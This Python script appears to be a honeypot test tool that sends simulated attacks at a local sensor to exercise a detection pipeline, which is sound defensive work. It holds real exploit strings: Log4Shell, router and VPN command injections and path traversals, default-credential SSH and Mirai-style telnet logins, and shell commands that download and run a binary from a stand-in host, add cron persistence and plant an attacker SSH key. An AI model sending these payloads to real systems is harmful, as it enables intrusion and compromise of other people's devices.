"""Send realistic but harmless attack traffic at a LOCAL sensor to test the pipeline.

    python simulate.py --host 127.0.0.1 [--ssh-port 2222 --telnet-port 2323 --http-port 8081]

Only ever point this at your own honeypot.
"""
import argparse
import random
import socket
import time

import httpx
import paramiko

CREDS = [("root", "123456"), ("root", "admin"), ("admin", "admin"), ("ubuntu", "ubuntu"),
         ("pi", "raspberry"), ("oracle", "oracle"), ("root", "P@ssw0rd"), ("user", "1234")]
SHELL = [
    "uname -a",
    "cat /proc/cpuinfo | grep name | wc -l",
    "whoami",
    "cd /tmp; wget http://192.0.2.10/bins/x86; chmod 777 x86; ./x86",
    "(crontab -l; echo '*/5 * * * * /tmp/.x/upd') | crontab -",
    "echo ssh-rsa AAAAB3Nza...attacker >> ~/.ssh/authorized_keys",
    "history -c; rm -rf ~/.bash_history",
]
HTTP = [
    ("GET", "/.env", {}, ""),
    ("GET", "/.git/config", {}, ""),
    ("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", {}, "<?php echo md5('hi'); ?>"),
    ("GET", "/", {"User-Agent": "${jndi:ldap://192.0.2.10:1389/Exploit}"}, ""),
    ("POST", "/GponForm/diag_Form?images/", {}, "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://192.0.2.10/gpon`;sh"),
    ("POST", "/ctrlt/DeviceUpgrade_1", {}, "<NewStatusURL>$(/bin/busybox wget -g 192.0.2.10 -l /tmp/m -r /mips)</NewStatusURL>"),
    ("GET", "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>/tmp/x)", {}, ""),
    ("POST", "/wp-login.php", {}, "log=admin&pwd=admin123&wp-submit=Log+In"),
    ("GET", "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession", {}, ""),
    ("POST", "/ssl-vpn/hipreport.esp", {"Cookie": "SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/x`curl${IFS}192.0.2.10`"}, ""),
    ("GET", "/manager/html", {"Authorization": "Basic dG9tY2F0OnMzY3JldA=="}, ""),
    ("GET", "/phpmyadmin/", {"User-Agent": "Mozilla/5.0 zgrab/0.x"}, ""),
    ("POST", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", {}, "echo;id"),
]


def ssh_session(host, port):
    for user, pw in random.sample(CREDS, 4):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host, port, user, pw, timeout=10, allow_agent=False, look_for_keys=False, banner_timeout=10)
        except paramiko.AuthenticationException:
            print(f"ssh  {user}/{pw}: rejected")
            continue
        except Exception as e:  # noqa: BLE001
            print(f"ssh  error: {e}")
            return
        print(f"ssh  {user}/{pw}: accepted, running {len(SHELL)} commands")
        chan = client.invoke_shell()
        chan.settimeout(5)
        for cmd in SHELL + ["exit"]:
            chan.send((cmd + "\n").encode())
            time.sleep(0.6)
            while chan.recv_ready():
                chan.recv(65536)
        client.close()
        return


def telnet_session(host, port):
    try:
        with socket.create_connection((host, port), timeout=10) as s:
            s.settimeout(3)
            for line in (b"root\r\n", b"xc3511\r\n", b"enable\r\n", b"system\r\n", b"shell\r\n",
                         b"/bin/busybox MIRAI\r\n"):
                time.sleep(0.5)
                s.sendall(line)
                try:
                    s.recv(4096)
                except socket.timeout:
                    pass
        print("telnet  mirai-style login sent")
    except OSError as e:
        print(f"telnet  error: {e}")


def http_attacks(base):
    with httpx.Client(base_url=base, verify=False, timeout=10) as c:
        for method, path, headers, body in HTTP:
            # httpx would normalise "..": send the raw target untouched
            req = c.build_request(method, "/", headers=headers, content=body or None)
            req.url = req.url.copy_with(raw_path=path.encode())
            r = c.send(req)
            print(f"http {r.status_code} {method} {path[:70]}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--ssh-port", type=int, default=2222)
    ap.add_argument("--telnet-port", type=int, default=2323)
    ap.add_argument("--http-port", type=int, default=8081)
    ap.add_argument("--rounds", type=int, default=1)
    a = ap.parse_args()
    for _ in range(a.rounds):
        http_attacks(f"http://{a.host}:{a.http_port}")
        ssh_session(a.host, a.ssh_port)
        telnet_session(a.host, a.telnet_port)


if __name__ == "__main__":
    main()
